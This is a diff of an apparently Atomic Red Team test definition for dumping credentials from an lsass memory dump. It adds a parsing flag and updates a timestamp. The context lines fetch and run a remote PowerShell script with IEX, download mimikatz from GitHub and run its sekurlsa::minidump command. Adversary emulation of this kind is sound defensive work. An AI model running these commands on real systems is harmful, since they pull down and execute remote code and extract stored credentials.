@@ -16,7 +16,7 @@
           {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
           = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"
           -UseBasicParsing); $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases";
-          $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
+          $zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url
           | where-object { $_.endswith(".zip") }; $basePath = Split-Path "PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe"
           | Split-Path; Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath;
           fi; PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe "sekurlsa::minidump
@@ -52,7 +52,7 @@
       get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n\
         IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"\
         \ -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\
-        \n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url\
+        \n$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url\
         \ | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\"\
         \ | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
     - description: 'Lsass dump must exist at specified location (#{input_file})
@@ -67,4 +67,4 @@
         '
     technique_created: '2020-02-11T18:41:44.783Z'
     atomic_guid: 453acf13-1dbd-47d7-b28a-172ce9228023
-    import_timestamp: '2026-10-20T07:08:30.238551Z'
+    import_timestamp: '2026-10-21T07:01:52.155087Z'
